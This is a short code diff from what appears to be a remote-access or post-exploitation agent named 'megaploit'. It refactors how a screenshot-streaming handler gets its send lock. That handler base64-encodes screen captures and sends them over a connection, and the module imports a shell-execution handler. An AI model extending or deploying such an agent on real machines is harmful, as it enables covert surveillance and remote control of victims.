@@ -41,7 +41,7 @@ import time
 import types
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-from megaploit.agent.handlers import _register, _shell_exec  # shared registry
+from megaploit.agent.handlers import _register, _shell_exec, get_send_lock  # shared registry
 from megaploit.core.protocol import send_msg as _send_msg, send_file as _send_file
 
 
@@ -506,7 +506,7 @@ def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
                                        [cv2.IMWRITE_JPEG_QUALITY, quality])
                 if ok:
                     b64 = base64.b64encode(buf.tobytes()).decode()
-                    with _send_lock:
+                    with get_send_lock():
                         _send_msg(conn, f"FRAME:{b64}")
                 elapsed = time.monotonic() - t0
                 sleep_t = delay - elapsed
